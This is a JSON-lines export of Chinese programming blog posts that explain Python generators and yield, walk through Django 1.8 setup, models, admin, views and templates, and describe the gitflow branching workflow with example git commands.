{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "python中yield的用法详解", "log_Intro": "python中yield的用法详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>首先我要吐槽一下，看程序的过程中遇见了yield这个关键字，然后百度的时候，发现没有一个能简单的让我懂的，讲起来真TM的都是头头是道，什么参数，什么传递的，还口口声声说自己的教程是最简单的，最浅显易懂的，我就想问没有有考虑过读者的感受。</p>\n\n<p>接下来是正题：</p>\n\n<p>首先，如果你还没有对yield有个初步分认识，那么你先把yield看做“return”，这个是直观的，它首先是个return，普通的return是什么意思，就是在程序中返回某个值，返回之后程序就不再往下运行了。看做return之后再把它看做一个是生成器（generator）的一部分（带yield的函数才是真正的迭代器），好了，如果你对这些不明白的话，那先把yield看做return,然后直接看下面的程序，你就会明白yield的全部意思了：</p>\n\n<p>def foo():<br>\n    print(\"starting...\")<br>\n    while True:<br>\n        res = yield 4<br>\n        print(\"res:\",res)<br>\ng = foo()<br>\nprint(next(g))<br>\nprint(\"*\"*20)<br>\nprint(next(g))<br>\n就这么简单的几行代码就让你明白什么是yield，代码的输出这个：</p>\n\n<p>starting...<br>\n4<br>\n********************<br>\nres: None<br>\n4<br>\n我直接解释代码运行顺序，相当于代码单步调试：</p>\n\n<p>1.程序开始执行以后，因为foo函数中有yield关键字，所以foo函数并不会真的执行，而是先得到一个生成器g(相当于一个对象)</p>\n\n<p>2.直到调用next方法，foo函数正式开始执行，先执行foo函数中的print方法，然后进入while循环</p>\n\n<p>3.程序遇到yield关键字，然后把yield想想成return,return了一个4之后，程序停止，并没有执行赋值给res操作，此时next(g)语句执行完成，所以输出的前两行（第一个是while上面的print的结果,第二个是return出的结果）是执行print(next(g))的结果，</p>\n\n<p>4.程序执行print(\"*\"*20)，输出20个*</p>\n\n<p>5.又开始执行下面的print(next(g)),这个时候和上面那个差不多，不过不同的是，这个时候是从刚才那个next程序停止的地方开始执行的，也就是要执行res的赋值操作，这时候要注意，这个时候赋值操作的右边是没有值的（因为刚才那个是return出去了，并没有给赋值操作的左边传参数），所以这个时候res赋值是None,所以接着下面的输出就是res:None,</p>\n\n<p>6.程序会继续在while里执行，又一次碰到yield,这个时候同样return 出4，然后程序停止，print函数输出的4就是这次return出的4.</p>\n\n<p> </p>\n\n<p>到这里你可能就明白yield和return的关系和区别了，带yield的函数是一个生成器，而不是一个函数了，这个生成器有一个函数就是next函数，next就相当于“下一步”生成哪个数，这一次的next开始的地方是接着上一次的next停止的地方执行的，所以调用next的时候，生成器并不会从foo函数的开始执行，只是接着上一步停止的地方开始，然后遇到yield后，return出要生成的数，此步就结束。</p>\n\n<p>****************************************************************************************************************************************</p>\n\n<p>def foo():<br>\n    print(\"starting...\")<br>\n    while True:<br>\n        res = yield 4<br>\n        print(\"res:\",res)<br>\ng = foo()<br>\nprint(next(g))<br>\nprint(\"*\"*20)<br>\nprint(g.send(7))<br>\n再看一个这个生成器的send函数的例子，这个例子就把上面那个例子的最后一行换掉了，输出结果：</p>\n\n<p>starting...<br>\n4<br>\n********************<br>\nres: 7<br>\n4<br>\n先大致说一下send函数的概念：此时你应该注意到上面那个的紫色的字，还有上面那个res的值为什么是None，这个变成了7，到底为什么，这是因为，send是发送一个参数给res的，因为上面讲到，return的时候，并没有把4赋值给res，下次执行的时候只好继续执行赋值操作，只好赋值为None了，而如果用send的话，开始执行的时候，先接着上一次（return 4之后）执行，先把7赋值给了res,然后执行next的作用，遇见下一回的yield，return出结果后结束。</p>\n\n<p> </p>\n\n<p>5.程序执行g.send(7)，程序会从yield关键字那一行继续向下运行，send会把7这个值赋值给res变量</p>\n\n<p>6.由于send方法中包含next()方法，所以程序会继续向下运行执行print方法，然后再次进入while循环</p>\n\n<p>7.程序执行再次遇到yield关键字，yield会返回后面的值后，程序再次暂停，直到再次调用next方法或send方法。</p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p>这就结束了，说一下，为什么用这个生成器，是因为如果用List的话，会占用更大的空间，比如说取0,1,2,3,4,5,6............1000</p>\n\n<p>你可能会这样：</p>\n\n<p>for n in range(1000):<br>\n    a=n<br>\n这个时候range(1000)就默认生成一个含有1000个数的list了，所以很占内存。</p>\n\n<p>这个时候你可以用刚才的yield组合成生成器进行实现，也可以用xrange(1000)这个生成器实现</p>\n\n<p>yield组合：</p>\n\n<p>def foo(num):<br>\n    print(\"starting...\")<br>\n    while num&lt;10:<br>\n        num=num+1<br>\n        yield num<br>\nfor n in foo(0):<br>\n    print(n)<br>\n输出：</p>\n\n<p>starting...<br>\n1<br>\n2<br>\n3<br>\n4<br>\n5<br>\n6<br>\n7<br>\n8<br>\n9<br>\n10<br>\n xrange(1000):</p>\n\n<p>for n in xrange(1000):<br>\n    a=n<br>\n 其中要注意的是python3时已经没有xrange()了，在python3中，range()就是xrange()了，你可以在python3中查看range()的类型，它已经是个&lt;class 'range'&gt;了，而不是一个list了，毕竟这个是需要优化的。<br>\n </p>\n                                    </div>", "log_PostTime": 1584891132, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django入门之开发环境搭建1.1", "log_Intro": "Django入门之开发环境搭建1.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"创建虚拟环境\">创建虚拟环境</h1>\n\n<ul><li>创建：mkvirtualenv [虚拟环境名称]</li>\n\t<li>删除：rmvirtualenv [虚拟环境名称]</li>\n\t<li>进入：workon [虚拟环境名称]</li>\n\t<li>退出：deactivate</li>\n\t<li>所有的虚拟环境，都位于/home/.virtualenvs目录下</li>\n\t<li>进入虚拟环境前的提示：</li>\n\t<li><img alt=\"\" class=\"has\" height=\"23\" src=\"https://img-blog.csdnimg.cn/20190818235606424.png\" width=\"259\"></li>\n</ul><p> </p>\n\n<ul><li>进入虚拟环境后的提示：</li>\n\t<li><img alt=\"\" class=\"has\" height=\"25\" src=\"https://img-blog.csdnimg.cn/20190818235730838.png\" width=\"204\"></li>\n</ul><p> </p>\n\n<ul><li>查看当前的所有虚拟环境：workon [两次tab键]</li>\n\t<li>查看虚拟环境中已经安装的包</li>\n</ul><pre class=\"has\">\n<code>pip list\npip freeze\n</code></pre>\n\n<h1 id=\"安装django\">安装django</h1>\n\n<ul><li>建议安装1.8.2版本，这是一个稳定性高、使用广、文档多的版本</li>\n</ul><pre class=\"has\">\n<code>pip install django==1.8.2\n</code></pre>\n\n<ul><li>查看版本：进入python shell，运行如下代码</li>\n</ul><pre class=\"has\">\n<code>import django\ndjango.get_version()\n</code></pre>\n\n<ul><li>说明：使用pip install django命令进行安装时，会自动删除旧版本，再安装新版本</li>\n</ul><h1 id=\"创建项目\">创建项目</h1>\n\n<ul><li>命令django-admin startproject test1</li>\n\t<li>进入test1目录，目录结构如下图：</li>\n\t<li><img alt=\"\" class=\"has\" height=\"132\" src=\"https://img-blog.csdnimg.cn/20190818235801957.png\" width=\"195\"></li>\n</ul><p> </p>\n\n<h1 id=\"目录说明\">目录说明</h1>\n\n<ul><li>manage.py：一个命令行工具，可以使你用多种方式对Django项目进行交互</li>\n\t<li>内层的目录：项目的真正的Python包</li>\n\t<li><em>_init</em> _.py：一个空文件，它告诉Python这个目录应该被看做一个Python包</li>\n\t<li>settings.py：项目的配置</li>\n\t<li>urls.py：项目的URL声明</li>\n\t<li>wsgi.py：项目与WSGI兼容的Web服务器入口</li>\n</ul>                                    </div>", "log_PostTime": 1584891133, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django设计模型1.2", "log_Intro": "Django设计模型1.2", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"设计介绍\">设计介绍</h1>\n\n<ul><li>本示例完成“图书-英雄”信息的维护，需要存储两种数据：图书、英雄</li>\n\t<li>图书表结构设计：\n\t<ul><li>表名：BookInfo</li>\n\t\t<li>图书名称：btitle</li>\n\t\t<li>图书发布时间：bpub_date</li>\n\t</ul></li>\n\t<li>英雄表结构设计：\n\t<ul><li>表名：HeroInfo</li>\n\t\t<li>英雄姓名：hname</li>\n\t\t<li>英雄性别：hgender</li>\n\t\t<li>英雄简介：hcontent</li>\n\t\t<li>所属图书：hbook</li>\n\t</ul></li>\n\t<li>图书-英雄的关系为一对多</li>\n</ul><h1 id=\"数据库配置\">数据库配置</h1>\n\n<ul><li>在settings.py文件中，通过DATABASES项进行数据库设置</li>\n\t<li>django支持的数据库包括：sqlite、mysql等主流数据库</li>\n\t<li><strong>Django默认使用SQLite数据库</strong></li>\n</ul><h1 id=\"创建应用\">创建应用</h1>\n\n<ul><li>在一个项目中可以创建一到多个应用，每个应用进行一种业务处理</li>\n\t<li>创建应用的命令：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">python manage.py startapp booktest</code></pre>\n\n<ul><li>应用的目录结构如下图</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"147\" src=\"https://img-blog.csdnimg.cn/20190829001712358.png\" width=\"184\"></p>\n\n<p>定义模型类</p>\n\n<ul><li>有一个数据表，就有一个模型类与之对应</li>\n\t<li>打开models.py文件，定义模型类</li>\n\t<li>引入包from django.db import models</li>\n\t<li>模型类继承自models.Model类</li>\n\t<li><strong>说明：不需要定义主键列，在生成时会自动添加，并且值为自动增长</strong></li>\n\t<li>当输出对象时，会调用对象的str方法</li>\n</ul><pre class=\"has\">\n<code class=\"language-python\">from django.db import models\n\nclass BookInfo(models.Model):\n    btitle = models.CharField(max_length=20)\n    bpub_date = models.DateTimeField()\n    def _ _str_ _(self):\n        return \"%d\" % self.pk\n\nclass HeroInfo(models.Model):\n    hname = models.CharField(max_length=20)\n    hgender = models.BooleanField()\n    hcontent = models.CharField(max_length=100)\n    hBook = models.ForeignKey('BookInfo')\n    def _ _str_ _(self):\n        return \"%d\" % self.pk</code></pre>\n\n<p>生成数据表</p>\n\n<ul><li>激活模型：编辑settings.py文件，将booktest应用加入到installed_apps中</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190829001845451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<ul><li>生成迁移文件：根据模型类生成sql语句</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">python manage.py migrate</code></pre>\n\n<p>测试数据操作</p>\n\n<ul><li>进入python shell，进行简单的模型API练习</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">python manage.py shell</code></pre>\n\n<ul><li>进入shell后提示如下：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"104\" src=\"https://img-blog.csdnimg.cn/2019082900203284.png\" width=\"652\"></p>\n\n<ul><li>引入需要的包：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">from booktest.models import BookInfo,HeroInfo\nfrom django.utils import timezone\nfrom datetime import *</code></pre>\n\n<ul><li>查询所有图书信息：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">BookInfo.objects.all()</code></pre>\n\n<ul><li>新建图书信息：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">b = BookInfo()\nb.btitle=\"射雕英雄传\"\nb.bpub_date=datetime(year=1990,month=1,day=10)\nb.save()</code></pre>\n\n<ul><li>查找图书信息：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">b=BookInfo.objects.get(pk=1)</code></pre>\n\n<ul><li>输出图书信息：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">b\nb.id\nb.btitle</code></pre>\n\n<ul><li>修改图书信息：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">b.btitle=u\"天龙八部\"\nb.save()</code></pre>\n\n<ul><li>删除图书信息：</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">b.delete()</code></pre>\n\n<p>关联对象的操作</p>\n\n<ul><li>对于HeroInfo可以按照上面的操作方式进行</li>\n\t<li>添加，注意添加关联对象</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">h=HeroInfo()\nh.htitle=u'郭靖'\nh.hgender=True\nh.hcontent=u'降龙十八掌'\nh.hBook=b\nh.save()</code></pre>\n\n<ul><li>获得关联集合：返回当前book对象的所有hero</li>\n</ul><pre class=\"has\">\n<code class=\"language-bash\">b.heroinfo_set.all()</code></pre>\n\n<ul><li>有一个HeroInfo存在，必须要有一个BookInfo对象，提供了创建关联的数据：</li>\n</ul><pre class=\"has\">\n<code>h=b.heroinfo_set.create(htitle=u'黄蓉',hgender=False,hcontent=u'打狗棍法')\nh</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891134, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "python Django 管理站点1.3", "log_Intro": "python Django 管理站点1.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"服务器\">服务器</h1>\n\n<ul><li>运行如下命令可以开启服务器</li>\n</ul><pre class=\"has\">\n<code>python manage.py runserver ip:port\n</code></pre>\n\n<ul><li>可以不写ip，默认端口为8000</li>\n\t<li>这是一个纯python编写的轻量级web服务器，仅在开发阶段使用</li>\n\t<li>服务器成功启动后，提示如下信息</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"153\" src=\"https://img-blog.csdnimg.cn/20190901191210765.png\" width=\"564\"></p>\n\n<p> </p>\n\n<ul><li>默认端口是8000，可以修改端口</li>\n</ul><pre class=\"has\">\n<code>python manage.py runserver 8080\n</code></pre>\n\n<ul><li>打开浏览器，输入网址“127.0.0.1:8000”可以打开默认页面</li>\n\t<li>如果修改文件不需要重启服务器，如果增删文件需要重启服务器</li>\n\t<li>通过ctrl+c停止服务器</li>\n</ul><h1 id=\"管理操作\">管理操作</h1>\n\n<ul><li>站点分为“内容发布”和“公共访问”两部分</li>\n\t<li>“内容发布”的部分负责添加、修改、删除内容，开发这些重复的功能是一件单调乏味、缺乏创造力的工作。为此，Django会根据定义的模型类完全自动地生成管理模块</li>\n</ul><p>使用django的管理</p>\n\n<ul><li>创建一个管理员用户</li>\n</ul><pre class=\"has\">\n<code>python manage.py createsuperuser，按提示输入用户名、邮箱、密码\n</code></pre>\n\n<ul><li>启动服务器，通过“127.0.0.1:8000/admin”访问，输入上面创建的用户名、密码完成登录</li>\n\t<li>进入管理站点，默认可以对groups、users进行管理</li>\n</ul><p>管理界面本地化</p>\n\n<ul><li>编辑settings.py文件，设置编码、时区</li>\n</ul><pre class=\"has\">\n<code>LANGUAGE_CODE = 'zh-Hans'\nTIME_ZONE = 'Asia/Shanghai'\n</code></pre>\n\n<p>向admin注册booktest的模型</p>\n\n<ul><li>打开booktest/admin.py文件，注册模型</li>\n</ul><pre class=\"has\">\n<code>from django.contrib import admin\nfrom models import BookInfo\nadmin.site.register(BookInfo)\n</code></pre>\n\n<ul><li>刷新管理页面，可以对BookInfo的数据进行增删改查操作</li>\n\t<li>问题：如果在str方法中返回中文，在修改和添加时会报ascii的错误</li>\n\t<li>解决：在str()方法中，将字符串末尾添加“.encode('utf-8')”</li>\n</ul><p>自定义管理页面</p>\n\n<ul><li>Django提供了admin.ModelAdmin类</li>\n\t<li>通过定义ModelAdmin的子类，来定义模型在Admin界面的显示方式</li>\n</ul><pre class=\"has\">\n<code>class QuestionAdmin(admin.ModelAdmin):\n    ...\nadmin.site.register(Question, QuestionAdmin)\n</code></pre>\n\n<p>列表页属性</p>\n\n<ul><li>list_display：显示字段，可以点击列头进行排序</li>\n</ul><pre class=\"has\">\n<code>list_display = ['pk', 'btitle', 'bpub_date']\n</code></pre>\n\n<ul><li>list_filter：过滤字段，过滤框会出现在右侧</li>\n</ul><pre class=\"has\">\n<code>list_filter = ['btitle']\n</code></pre>\n\n<ul><li>search_fields：搜索字段，搜索框会出现在上侧</li>\n</ul><pre class=\"has\">\n<code>search_fields = ['btitle']\n</code></pre>\n\n<ul><li>list_per_page：分页，分页框会出现在下侧</li>\n</ul><pre class=\"has\">\n<code>list_per_page = 10\n</code></pre>\n\n<p>添加、修改页属性</p>\n\n<ul><li>fields：属性的先后顺序</li>\n</ul><pre class=\"has\">\n<code>fields = ['bpub_date', 'btitle']\n</code></pre>\n\n<ul><li>fieldsets：属性分组</li>\n</ul><pre class=\"has\">\n<code>fieldsets = [\n    ('basic',{'fields': ['btitle']}),\n    ('more', {'fields': ['bpub_date']}),\n]\n</code></pre>\n\n<p>关联对象</p>\n\n<ul><li>\n\t<p>对于HeroInfo模型类，有两种注册方式</p>\n\n\t<ul><li>方式一：与BookInfo模型类相同</li>\n\t\t<li>方式二：关联注册</li>\n\t</ul></li>\n\t<li>\n\t<p>按照BookInfor的注册方式完成HeroInfo的注册</p>\n\t</li>\n\t<li>接下来实现关联注册</li>\n</ul><pre class=\"has\">\n<code>from django.contrib import admin\nfrom models import BookInfo,HeroInfo\n\nclass HeroInfoInline(admin.StackedInline):\n    model = HeroInfo\n    extra = 2\n\nclass BookInfoAdmin(admin.ModelAdmin):\n    inlines = [HeroInfoInline]\n\nadmin.site.register(BookInfo, BookInfoAdmin)\n</code></pre>\n\n<ul><li>可以将内嵌的方式改为表格</li>\n</ul><pre class=\"has\">\n<code>class HeroInfoInline(admin.TabularInline)\n</code></pre>\n\n<p>布尔值的显示</p>\n\n<ul><li>发布性别的显示不是一个直观的结果，可以使用方法进行封装</li>\n</ul><pre class=\"has\">\n<code>def gender(self):\n    if self.hgender:\n        return '男'\n    else:\n        return '女'\ngender.short_description = '性别'\n</code></pre>\n\n<ul><li>在admin注册中使用gender代替hgender</li>\n</ul><pre class=\"has\">\n<code>class HeroInfoAdmin(admin.ModelAdmin):\n    list_display = ['id', 'hname', 'gender', 'hcontent']</code></pre>\n                                    </div>", "log_PostTime": 1584891135, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "gitflow分支管理模型", "log_Intro": "gitflow分支管理模型", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>gitflow的分支类型：</p>\n\n<ul><li>master分支（1个）</li>\n\t<li>develop分支（1个）</li>\n\t<li>feature分支。同时存在多个。</li>\n\t<li>release分支。同一时间只有1个，生命周期很短，只是为了发布。</li>\n\t<li>hotfix分支。同一时间只有1个。生命周期较短，用了修复bug或小粒度修改发布。</li>\n</ul><p>在这个模型中，master和develop都具有象征意义。master分支上的代码总是稳定的（stable build），随时可以发布出去。develop上的代码总是从feature上合并过来的，可以进行Nightly Builds，但不直接在develop上进行开发。当develop上的feature足够多以至于可以进行新版本的发布时，可以创建release分支。</p>\n\n<p>release分支基于develop，进行很简单的修改后就被合并到master，并打上tag，表示可以发布了。紧接着release将被合并到develop；此时develop可能往前跑了一段，出现合并冲突，需要手工解决冲突后再次合并。这步完成后就删除release分支。</p>\n\n<p>当从已发布版本中发现bug要修复时，就应用到hotfix分支了。hotfix基于master分支，完成bug修复或紧急修改后，要merge回master，打上一个新的tag，并merge回develop，删除hotfix分支。</p>\n\n<p>由此可见release和hotfix的生命周期都较短，master/develop虽然总是存在但却不常使用。</p>\n\n<p>以上就是gitflow的基本概念了。下面是nvie（gitflow的提出者，一个荷兰人！） <a href=\"http://nvie.com/posts/a-successful-git-branching-model/\" rel=\"nofollow\">A successful Git branching model</a>（发布于2010年月5日）一文的笔记。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5iZXJsaW5peC5jb20vaW1hZ2VzL2dpdGZsb3ctbGF5b3V0LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>从右看起：</p>\n\n<ul><li>时间轴。</li>\n\t<li>feature（玫红）。主要是自己玩了，差不多的时候要合并回develop去。从不与master交互。</li>\n\t<li>develop（黄色）。主要是和feature以及release交互。</li>\n\t<li>release（绿色）。总是基于develop，最后又合并回develop。当然对应的tag跑到master这边去了。</li>\n\t<li>hotfix（红色）。总是基于master，并最后合并到master和develop。</li>\n\t<li>master（蓝色）。没有什么东西，仅是一些关联的tag，因从不在master上开发。</li>\n</ul><p>接下来nvie说道自己喜爱git，因git改变了人们对合并/分支（merge/branches）的看法。从集中式的代码管理工具过来的人感到释放了（beware of merge conflicts, they bite you，注意合并冲突，它们会跳出来咬你！）。</p>\n\n<h1>gitflow实例</h1>\n\n<p>安装gitflow：</p>\n\n<pre>\n$ git clone --recursive git://github.com/nvie/gitflow.git\n$ cd gitflow/\n$ sudo make install\n$ ls /usr/local/bin/git-flow\n/usr/local/bin/git-flow</pre>\n\n<p>到项目根目录下执行gitflow，因为之前修改没有commit，所以gitflow初始化失败：</p>\n\n<pre>\n$ git flow init\nfatal: Working tree contains unstaged changes. Aborting.</pre>\n\n<p>commit后再次进行gitflow初始化：</p>\n\n<pre>\n$ git commit -a -m \"update Bash\"\n[master 8f5b874] update Bash\n 4 files changed, 71 insertions(+), 5 deletions(-)\n\n[bailing@zhuji zhuji]$ git flow init\n\nWhich branch should be used for bringing forth production releases?\n   - master\nBranch name for production releases: [master] \nBranch name for \"next release\" development: [develop] \n\nHow to name your supporting branch prefixes?\nFeature branches? [feature/] \nRelease branches? [release/] \nHotfix branches? [hotfix/] \nSupport branches? [support/] \nVersion tag prefix? [] </pre>\n\n<p>一路回车下来，各个分支名都按默认的设置。最后，当前分支已经被切换到了develop：</p>\n\n<pre>\n$ git branch\n* develop\n  master</pre>\n\n<p>建立一个新的feature。git flow新建了功能分支feature/blog_builder，并在develop的基础上checkout了新分支：</p>\n\n<pre>\n$ git flow feature start blog_builder\n$ git branch\n  develop\n* feature/blog_builder\n  master</pre>\n\n<p>开发完成后执行如下命令：</p>\n\n<pre>\n$ git flow feature finish blog_builder\nSummary of actions:\n- The feature branch 'feature/blog_builder' was merged into 'develop'\n- Feature branch 'feature/blog_builder' has been removed\n- You are now on branch 'develop'</pre>\n\n<p>正如这条命令的总结所言，git flow为我们做了3件事：</p>\n\n<ul><li>把feature/blog_builder合并到了develop。</li>\n\t<li>删除了feature/blog_builder分支。</li>\n\t<li>切换回develop分支。</li>\n</ul><p>接下来发布一个正常的版本：</p>\n\n<pre>\n$ git flow release start v0.5</pre>\n\n<p>一旦需要发布的版本确认无误可以发布后，执行命令：</p>\n\n<pre>\n$ git flow release finish v0.5\nsummary of actions:\n- Latest objects have been fetched from 'origin'\n- Release branch has been merged into 'master'\n- The release was tagged 'v0.5'\n- Release branch has been back-merged into 'develop'\n- Release branch 'release/v0.5' has been deleted</pre>\n\n<p>注意release/v0.5被合并到了master和develop分支，并打了个v0.5的tag，然后被删除，最后切换回了develop分支：</p>\n\n<pre>\n$ git branch\n* develop\n  master</pre>\n\n<p>发布时只需将tag为v0.5的版本checkout出来部署即可：</p>\n\n<pre>\n$ git tag\nv0.5</pre>\n\n<p>当上线后发现v0.5的bug，可以进行hotfix：</p>\n\n<pre>\n$ git flow hotfix start v0.5.1</pre>\n\n<p>此时gitflow从master分支上拉出一个hotfix/v0.5.1的分支，接下来在新分支上修改bug。最后执行命令：</p>\n\n<pre>\n$ git flow hotfix finish v0.5.1</pre>\n\n<p>这样hotfix/v0.5.1被merge到master/develop分支，打好v0.5.1这个tag，删除这个分支，切换回develop分支。</p>\n\n<p>之后又是新一次的轮回，启动正常的feature开发。</p>\n                                    </div>", "log_PostTime": 1584891137, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 视图和模板1.4", "log_Intro": "Django 视图和模板1.4", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1> </h1>\n\n<h1 id=\"视图\">视图</h1>\n\n<ul><li>在django中，视图对WEB请求进行回应</li>\n\t<li>视图接收reqeust对象作为第一个参数，包含了请求的信息</li>\n\t<li>视图就是一个Python函数，被定义在views.py中</li>\n</ul><pre class=\"has\">\n<code>#coding:utf-8\nfrom django.http import HttpResponse\n\ndef index(request):\n    return HttpResponse(\"index\")\ndef detail(request,id):\n    return HttpResponse(\"detail %s\" % id)\n</code></pre>\n\n<ul><li>定义完成视图后，需要配置urlconf，否则无法处理请求</li>\n</ul><h1 id=\"urlconf\">URLconf</h1>\n\n<ul><li>在Django中，定义URLconf包括正则表达式、视图两部分</li>\n\t<li>Django使用正则表达式匹配请求的URL，一旦匹配成功，则调用应用的视图</li>\n\t<li><strong>注意：只匹配路径部分，即除去域名、参数后的字符串</strong></li>\n\t<li>在test1/urls.py插入booktest，使主urlconf连接到booktest.urls模块</li>\n</ul><pre class=\"has\">\n<code>url(r'^', include('booktest.urls')),\n</code></pre>\n\n<ul><li>在booktest中的urls.py中添加urlconf</li>\n</ul><pre class=\"has\">\n<code>from django.conf.urls import url\nfrom . import views\nurlpatterns = [\n    url(r'^$', views.index),\n    url(r'^([0-9]+)/$', views.detail),\n]</code></pre>\n\n<p> </p>\n\n<h1 id=\"模板\">模板</h1>\n\n<ul><li>模板是html页面，可以根据视图中传递的数据填充值</li>\n\t<li>创建模板的目录如下图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"94\" src=\"https://img-blog.csdnimg.cn/20190907172930763.png\" width=\"219\"></p>\n\n<p> </p>\n\n<ul><li>修改settings.py文件，设置TEMPLATES的DIRS值</li>\n</ul><pre class=\"has\">\n<code>'DIRS': [os.path.join(BASE_DIR, 'templates')],\n</code></pre>\n\n<ul><li>在模板中访问视图传递的数据</li>\n</ul><pre class=\"has\">\n<code>{{输出值，可以是变量，也可以是对象.属性}}\n{%执行代码段%}\n</code></pre>\n\n<p>定义index.html模板</p>\n\n<pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;首页&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;图书列表&lt;/h1&gt;\n&lt;ul&gt;\n{%for book in booklist%}\n&lt;li&gt;\n  &lt;a href=\"{{book.id}}\"&gt;\n    {{book.btitle}}\n  &lt;/a&gt;\n&lt;/li&gt;\n{%endfor%}\n&lt;/ul&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>定义detail.html模板</p>\n\n<ul><li>在模板中访问对象成员时，都以属性的方式访问，即方法也不能加括号</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;详细页&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;{{book.btitle}}&lt;/h1&gt;\n&lt;ul&gt;\n  {%for hero in book.heroinfo_set.all%}\n  &lt;li&gt;{{hero.hname}}---{{hero.hcontent}}&lt;/li&gt;\n  {%endfor%}\n&lt;/ul&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<h1 id=\"使用模板\">使用模板</h1>\n\n<ul><li>编辑views.py文件，在方法中调用模板</li>\n</ul><pre class=\"has\">\n<code>from django.http import HttpResponse\nfrom django.template import RequestContext, loader\nfrom models import BookInfo\n\ndef index(request):\n    booklist = BookInfo.objects.all()\n    template = loader.get_template('booktest/index.html')\n    context = RequestContext(request, {'booklist': booklist})\n    return HttpResponse(template.render(context))\n\n\ndef detail(reqeust, id):\n    book = BookInfo.objects.get(pk=id)\n    template = loader.get_template('booktest/detail.html')\n    context = RequestContext(reqeust, {'book': book})\n    return HttpResponse(template.render(context))\n</code></pre>\n\n<h1 id=\"去除模板的硬编码\">去除模板的硬编码</h1>\n\n<ul><li>在index.html模板中，超链接是硬编码的，此时的请求地址为“127.0.0.1/1/”</li>\n</ul><pre class=\"has\">\n<code>&lt;a href=\"{{book.id}}\"&gt;\n</code></pre>\n\n<ul><li>看如下情况：将urlconf中详细页改为如下，链接就找不到了</li>\n</ul><pre class=\"has\">\n<code>url(r'^book/([0-9]+)/$', views.detail),\n</code></pre>\n\n<ul><li>此时的请求地址应该为“127.0.0.1/book/1/”</li>\n\t<li>问题总结：如果在模板中地址硬编码，将来urlconf修改后，地址将失效</li>\n\t<li>解决：使用命名的url设置超链接</li>\n\t<li>修改test1/urls.py文件，在include中设置namespace</li>\n</ul><pre class=\"has\">\n<code>url(r'^admin/', include(admin.site.urls, namespace='booktest')),\n</code></pre>\n\n<ul><li>修改booktest/urls.py文件，设置name</li>\n</ul><pre class=\"has\">\n<code>url(r'^book/([0-9]+)/$', views.detail, name=\"detail\"),\n</code></pre>\n\n<ul><li>修改index.html模板中的链接</li>\n</ul><pre class=\"has\">\n<code>&lt;a href=\"{%url 'booktest:detail' book.id%}\"&gt;\n</code></pre>\n\n<h1 id=\"render简写\">Render简写</h1>\n\n<ul><li>Django提供了函数Render()简化视图调用模板、构造上下文</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import render\nfrom models import BookInfo\n\ndef index(reqeust):\n    booklist = BookInfo.objects.all()\n    return render(reqeust, 'booktest/index.html', {'booklist': booklist})\n\n\ndef detail(reqeust, id):\n    book = BookInfo.objects.get(pk=id)\n    return render(reqeust, 'booktest/detail.html', {'book': book})</code></pre>\n                                    </div>", "log_PostTime": 1584891138, "log_Meta": ""}
